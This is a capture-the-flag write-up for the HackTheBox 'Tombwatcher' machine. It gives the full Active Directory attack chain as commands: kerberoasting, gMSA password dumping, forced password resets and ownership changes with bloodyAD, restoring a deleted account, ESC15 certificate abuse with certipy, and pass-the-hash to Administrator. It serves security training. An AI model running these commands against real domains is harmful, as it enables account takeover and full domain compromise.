---
title: "Tombwatcher HackTheBox" 
date: 2025-06-25 23:50:00 0000+
tags: [WriteUp, Tombwatcher, HTB, Enumeration, Active Directory, DeletedADObjects, ADCS, Hash Cracking, Kerberoasting, Lateral Movement, Bloodhound, ESC15, gMSA Abuse, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Tombwatcher_HTB/preview_tombwatcher.png
---

# Tombwatcher HTB Writeup

Tombwatcher is a medium level Hackthebox machine which is based on the assumed breach scenario (means we have valid credentials) which focusses mainly on kerberoasting, hash cracking, common passwords, abuse gMSA, recover deleted AD Objects and finally ADCS to gain Administrator.

## Initial Enumeration

### Nmap reconnaissance

We are gonna start off with the rustmap( rustscan and nmap) to find the open ports and services. We observed that its an Active directory box.
```bash
rustmap.py -ip 10.10.11.72
```
[https://github.com/A45hw1n/Rustmap](https://github.com/A45hw1n/Rustmap)

![image.png](/assets/images/Tombwatcher_HTB/image.png)

![image.png](/assets/images/Tombwatcher_HTB/image%201.png)

### Bloodhound

Since this is an assumed breach scenario means we can authenticate, I will use bloodhound-python to gather all the ldap data from the domain.

```bash
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -dc dc01.tombwatcher.htb -d tombwatcher.htb -ns '10.10.11.72' -c all --zip
```

If you get a clock skew error run the following command.

```bash
sudo ntpdate '10.10.11.72'
```

![image.png](/assets/images/Tombwatcher_HTB/image%202.png)

Successfully gathered bloodhound data !

## Exploitation

Started the **neo4j console** and ran bloodhound, also we own user henry so we mark henry as owned.

Reachable high value targets from user henry is graphed below.

![image.png](/assets/images/Tombwatcher_HTB/image%203.png)

### Henry → Alfred

![image.png](/assets/images/Tombwatcher_HTB/image%204.png)

User henry has **WriteSPN** permissions on Alfred means we can add a fake SPN to alfred such as “HTTP/fakehost” means we can kerberoast it.

Also we can request a TGS for the same account, and since the TGS is encrypted using the Alfred’s NTLM hash we can crack it offline. 

```bash
/opt/targetedKerberoast/targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

![image.png](/assets/images/Tombwatcher_HTB/image%205.png)

Done kerberoasting and got the hash for Alfred, now cracking it offline using hashcat.

![image.png](/assets/images/Tombwatcher_HTB/image%206.png)

We now mark Alfred as owned and we have his credentials.

### Alfred → Infrastructure

![image.png](/assets/images/Tombwatcher_HTB/image%207.png)

As we can see from bloodhound as Alfred we can add ourselves to the Infrastructure group, we can do this by using BloodyAD.

[https://github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "alfred" -p "<...>" add groupMember "infrastructure" "alfred"
```

![image.png](/assets/images/Tombwatcher_HTB/image%208.png)

We can confirm that Alfred is added to the Infrastructure group by using →

```bash
net rpc group members "infrastructure" -U "tombwatcher.htb"/"alfred"%"<...>" -S "DC01.tombwatcher.htb"
```

![image.png](/assets/images/Tombwatcher_HTB/image%209.png)

Since now we own Infrastructure group as we have added Alfred to it.

### Infrastructure → Ansible_Dev$

![image.png](/assets/images/Tombwatcher_HTB/image%2010.png)

Now the members of the Infrastructure group can read GMSA password of the Ansible_dev$ machine account.

We used GMSADumper to get the hash of ansible_dev$ machine account.

[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)

```bash
python3 /opt/gMSADumper/gMSADumper.py -u alfred -p "<...>" -l 10.129.232.198 -d tombwatcher.htb
```

![image.png](/assets/images/Tombwatcher_HTB/image%2011.png)

We have aes256hmac and rc4_ntlm for the ansible_dev$ account.

Confirming that we have received the correct rc4_ntlm hash.

![image.png](/assets/images/Tombwatcher_HTB/image%2012.png)

### Ansible_dev$ → Sam

![image.png](/assets/images/Tombwatcher_HTB/image%2013.png)

Now we can see that Ansible_dev$ has privileges to force set password of sam account, this can also be done by BloodyAD.

```bash
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "ansible_dev$" -p :<ansible account hash> set password "sam" "aashwin29!"
```

![image.png](/assets/images/Tombwatcher_HTB/image%2014.png)

So now we own Sam user account.

### Sam → John

![image.png](/assets/images/Tombwatcher_HTB/image%2015.png)

Now as user Sam we have **WriteOwner** permissions on John, we set the owner of John account as Sam.

```bash
bloodyAD --host "10.129.232.198" -d "tombwatcher.htb" -u "sam" -p "aashwin29!" set owner "john" "sam"
```

![image.png](/assets/images/Tombwatcher_HTB/image%2016.png)

Now as the owner of John account, I can now grant Sam **GenericAll** on John.

```bash
bloodyAD --host "10.129.232.198" -d "tombwatcher.htb" -u "sam" -p "aashwin29!" add genericAll "john" "sam"
```

![image.png](/assets/images/Tombwatcher_HTB/image%2017.png)

Now we have generic all so we can change the password of John as Sam.

```bash
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "sam" -p "aashwin29!" set password "john" "aashwin7!"
```

![image.png](/assets/images/Tombwatcher_HTB/image%2018.png)

Confirming that we have changed the password for John using Netexec.

```bash
nxc winrm tombwatcher.htb -u 'john' -p 'aashwin7!'
```

![image.png](/assets/images/Tombwatcher_HTB/image%2019.png)

So now we have successfully owned John, marking John as owned.

### John(psremote) → DC01

![image.png](/assets/images/Tombwatcher_HTB/image%2020.png)

John can psremote (winrm) into the DC, so we used evil-winrm to login and grab our user.txt

```bash
evil-winrm -i 10.129.232.198 -u 'john' -p 'aashwin7!'
```

![image.png](/assets/images/Tombwatcher_HTB/image%2021.png)

Did a lot of research and looked around in bloodhound but didn’t find anything.

Fortunately, I got a hint from the machine name and checked the deleted AD objects.

This revealed a deleted AD user account named **cert_admin** this user is probably associated with **Active Directory Certificate Services or ADCS**.

Also look at this article.

https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html.

```bash
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" –IncludeDeletedObjects
```

![image.png](/assets/images/Tombwatcher_HTB/image%2022.png)

Now we recover this user (cert_admin) using the below commands.

```bash
# for recovering the cert_admin user
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Enable-ADAccount -Identity cert_admin
```

![image.png](/assets/images/Tombwatcher_HTB/image%2023.png)

Using net utility to retrieve all the users and verify that we have successfully recovered the cert_admin user.

![image.png](/assets/images/Tombwatcher_HTB/image%2024.png)

### Bloodhound 2

So after the recovery of the account we first need to reset its password and to do that I again ran a bloodhound scan to include the cert_admin user.

### John → Cert_admin

![image.png](/assets/images/Tombwatcher_HTB/image%2026.png)

We saw that John has **GenericAll** on Cert_Admin.

So first we disabled UAC on user Cert_admin and then we set its new password as John.

```bash
bloodyAD --host '10.129.232.198' -u 'john' -p "aashwin7!" -d 'tombwatcher.htb' set password cert_admin "aashwin10!"
```

![image.png](/assets/images/Tombwatcher_HTB/image%2027.png)

Successfully owned the user Cert_admin.

### ADCS - ESC15

Using certipy to to find the vulnerable templates.

[https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

```bash
certipy find -u 'cert_admin' -p 'aashwin10!' -dc-ip '10.129.232.198' -vulnerable -text -enabled -stdout
```

![image.png](/assets/images/Tombwatcher_HTB/image%2028.png)

**Method 1**

```bash
certipy req -u 'cert_admin' -p 'aashwin10!' -dc-ip '10.129.232.198' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template '<vulnerable_template_name>' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
```

![image.png](/assets/images/Tombwatcher_HTB/image%2029.png)

But after getting the administrator.pfx but I wasn’t able to authenticate and get the administrator hash.

**Method 2**

Please refer to the following ESC15 vulnerability article on github.

[https://github.com/rayngnpc/CVE-2024-49019-rayng](https://github.com/rayngnpc/CVE-2024-49019-rayng)

```bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'aashwin10!' -dc-ip '10.129.232.198' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template '<vulnerable_template_name>' -application-policies 'Certificate Request Agent'
```

![image.png](/assets/images/Tombwatcher_HTB/image%2030.png)

Doing so we get cert_admin.pfx file, which we can use to impersonate as administrator to request a certificate for the administrator@tombstone.htb.

```bash
certipy req -u 'cert_admin@dc01.tombwatcher.htb' -p 'aashwin10!' -on-behalf-of tombwatcher\\Administrator -template 'User' -ca 'tombwatcher-CA-1' -pfx cert_admin.pfx -dc-ip '10.129.232.198'
```

![image.png](/assets/images/Tombwatcher_HTB/image%2031.png)

Now we can authenticate using the administrator.pfx to get the NTLM hash of the administrator@tombstone.htb account.

```bash
certipy auth -pfx administrator.pfx -dc-ip '10.129.232.198'
```

![image.png](/assets/images/Tombwatcher_HTB/image%2032.png)

## Shell as Administrator

Finally using the PTH (pass the hash) to winRM into the box to grab the root.txt as Administrator.

![image.png](/assets/images/Tombwatcher_HTB/image%2033.png)

### Rooted!

![image.png](/assets/images/Tombwatcher_HTB/image%2034.png)

Thanks for Reading.

Follow me on HackTheBox.

https://app.hackthebox.com/profile/886877

Note :- I also changed the OpenVPN file and reset the machine as it is giving me some issues with the certificate templates, you all may observe the change of Machine IP.
